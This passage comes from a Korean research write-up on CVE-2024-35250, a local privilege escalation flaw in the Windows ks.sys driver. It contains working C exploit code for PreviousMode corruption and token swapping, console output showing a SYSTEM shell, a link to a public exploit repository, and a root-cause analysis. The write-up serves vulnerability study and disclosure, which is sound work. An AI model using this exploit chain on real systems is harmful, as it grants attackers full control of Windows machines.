방법 1: DbgkpTriageDumpRestoreState 사용

```c
// 낮은 주소에 메모리 할당 (rcx 하위 4바이트만 전달되므로)
void* alloc_addr = VirtualAlloc((void*)0x10000000, 0x1000, 
                                MEM_COMMIT | MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE);
memset(alloc_addr, 0, 0x1000);

uint64_t* qwords = (uint64_t*)alloc_addr;
uint32_t* dwords = (uint32_t*)alloc_addr;

// 구조체 구성
// 0x00: 덮을 주소 - 0x2078
qwords[0x00 / 8] = Curthread + 0x232 - 0x2078;  // PreviousMode offset = 0x232

// 0x10: 쓸 값의 하위 4바이트 (0x00000801 → 0x00000800)
dwords[0x10 / 4] = 0x00000800;

// 0x14: 쓸 값의 상위 4바이트 (주변 필드 보존)
dwords[0x14 / 4] = 0x00100100;

// 가젯 주소 설정
pInBufData->ptr_ArbitraryFunCall = (void*)(ULONG_PTR)(nt_base + 0x7f26f0);

// rcx에 전달될 주소
pOutBufData->Destination = (void*)(ULONG_PTR)(0x10000000);
```

![메모리 레이아웃](/assets/images/writings/06-memory-layout.svg){:width="100%" height="auto"}

방법 2: ExpProfileDelete 사용

```c
// 공격 대상 주소 계산
uint64_t previous_mode_addr = (uint64_t)Curthread + 0x232;
uint64_t indirect_pointer_value = previous_mode_addr + 0x30;

// 가상 메모리 할당
void* fake_rcx = (void*)0x10000000;
VirtualAlloc(fake_rcx, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memset(fake_rcx, 0, 0x1000);

// fake_rcx가 가리키는 곳에 간접 주소 설정
*(uint64_t*)fake_rcx = indirect_pointer_value;

// 가젯 주소 설정
pInBufData->ptr_ArbitraryFunCall = (void*)(ULONG_PTR)(nt_base + 0xA023D0);

// rcx에 전달될 주소
pOutBufData->Destination = (void*)(ULONG_PTR)((uint64_t)fake_rcx);
```

#### 4.5.4 Token Swapping 및 권한 상승

취약한 IOCTL 호출 후 `PreviousMode`가 0으로 변조되면 `NtWriteVirtualMemory`로 커널 메모리에 직접 쓸 수 있게 된다. `PreviousMode`가 0으로 바뀐 상태에서는 `NtWriteVirtualMemory`의 source buffer로 커널 주소를 넘길 수 있으므로, SYSTEM 프로세스의 Token 필드 주소를 source로 두고 현재 프로세스의 Token 필드 주소를 destination으로 사용한다.

```c
char mode = 1;

// Token Swapping: 현재 프로세스 Token을 SYSTEM Token으로 덮어쓰기
NtWriteVirtualMemory(GetCurrentProcess(), 
    (void*)(ULONG_PTR)(Curproc + 0x4b8),   // 현재 프로세스 Token 주소
    (void*)(ULONG_PTR)(Sysproc + 0x4b8),   // SYSTEM 프로세스 Token 주소
    TOKEN_SIZE, 0);                         // EPROCESS->Token offset: 0x4b8

// PreviousMode 복구 (1 = UserMode)
NtWriteVirtualMemory(GetCurrentProcess(), 
    (void*)(ULONG_PTR)(Curthread + 0x232), // PreviousMode 주소
    &mode,                                  // 1 (UserMode)
    sizeof(mode), 0);                       // PreviousMode offset: 0x232

// SYSTEM 권한 쉘 실행
system("cmd.exe");
```

그런데 `PreviousMode`가 KernelMode로 남아 있으면 이후 사용자 모드 API 호출에서 포인터 검증 방식이 달라져 예기치 않은 커널 접근이나 BSOD로 이어질 수 있다. 따라서 권한 상승 직후 반드시 `PreviousMode`를 UserMode(1)로 복구해야 한다.

### 4.6 Exploit 결과

Exploit 실행 결과:

```
C:\Users\user>whoami
desktop-xxx\user

C:\Users\user>exploit.exe
[+] System EPROCESS: 0xffffb487430ef040
[+] Current KTHREAD address: ffffb48746409080
[+] Current EPROCESS: 0xffffb487475db080
[+] ptr_ArbitraryFunCall (jmp rax) = FFFFF807069F26F0
[+] RCX will point to: 0000000010000000
[+] Exploit complete. Spawning SYSTEM shell.

Microsoft Windows [Version 10.0.22621.3447]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user>whoami
nt authority\system
```

`whoami` 명령어 실행 결과, 현재 프로세스가 **NT AUTHORITY\SYSTEM** 권한으로 실행됨을 확인할 수 있다. 커널 구조체 수정과 Token Swapping이 모두 의도대로 동작했음을 입증한다.

프로젝트에서 작성한 PoC와 Exploit 코드는 아래 저장소에 정리되어 있다.

- [WHS3-KernelPanic: CVE-2024-35250 PoC/Exploit](https://github.com/zsxen/WHS3-KernelPanic)

---

## 5. 결론

### 5.1 취약점 요약

CVE-2024-35250은 Windows 커널 스트리밍 드라이버(`ks.sys`)의 `UnserializePropertySet` 처리 과정에서 발생하는 신뢰 경계 위반 취약점이다. 핵심은 사용자 모드에서 유래한 데이터가 내부 IOCTL 재호출 과정에서 `KernelMode` 요청의 데이터처럼 재해석되는 access mode mismatch에 있다.

| 항목 | 내용 |
|---|---|
| 취약점 유형 | 신뢰되지 않은 포인터 역참조 (CWE-822) |
| 영향 | 로컬 권한 상승 (LPE) |
| Root Cause | IOCTL 재호출 과정에서 사용자 데이터와 `RequestorMode` 신뢰 수준이 불일치 |
| Primitive | 제한적인 커널 함수 호출 primitive |
| Exploit 흐름 | `PreviousMode` 변조 → 커널 메모리 write → Token Swapping |

### 5.2 프로젝트에서 확인한 내용

이번 프로젝트에서는 Root Cause 분석을 중심으로 다음 내용을 확인했다.

1. `IOCTL_KS_PROPERTY` 요청이 `KSPROPERTY_TYPE_UNSERIALIZESET` 경로로 들어갈 때, `UnserializePropertySet` 내부에서 IOCTL이 재구성되는 흐름을 추적했다.
2. 재구성된 IRP의 `RequestorMode`가 `KernelMode`로 설정되면서, 사용자 입력에서 유래한 값이 `ksthunk.sys`의 검증 우회 경로까지 도달할 수 있음을 확인했다.
3. PoC를 통해 공격자가 제어한 함수 포인터와 인자가 커널의 indirect call 지점까지 전달되는 것을 확인했다.
4. 프로젝트 재현 환경에서는 이 primitive를 `PreviousMode` 변조와 Token Swapping으로 연결해 SYSTEM 권한 상승 흐름까지 확인했다.

### 5.3 배운 점

이번 분석에서 특히 인상적이었던 부분은 `RequestorMode`가 단순한 플래그가 아니라, 드라이버의 검증 경로를 바꾸는 신뢰 판단 기준으로 사용된다는 점이었다.

- 신뢰 경계는 포인터가 어느 메모리에 있느냐보다, 그 값이 어디서 유래했는지를 기준으로 봐야 한다.
- `RequestorMode`는 IRP 생성자의 실행 모드를 나타내지만, IRP 안에 담긴 데이터의 실제 출처까지 보장하지는 않는다.
- kCFG가 적용된 환경에서도 유효한 커널 함수의 부수 효과를 이용하면, 제한적인 primitive를 exploit 체인으로 확장할 수 있다.

---

## 참고 자료

- [Microsoft: IoBuildDeviceIoControlRequest function (wdm.h)](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest)
- [MSRC: CVE-2024-35250](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250)
- [Windows Kernel Streaming Architecture](https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/)
- [Microsoft: PreviousMode](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/previousmode)
- [Microsoft: KSPROPERTY structure](https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure)
- [Microsoft: IOCTL_KS_PROPERTY](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property)
- [DEVCORE: Streaming vulnerabilities from Windows Kernel - Part I](https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/)
- [DEVCORE: Streaming vulnerabilities from Windows Kernel - Part II](https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/)
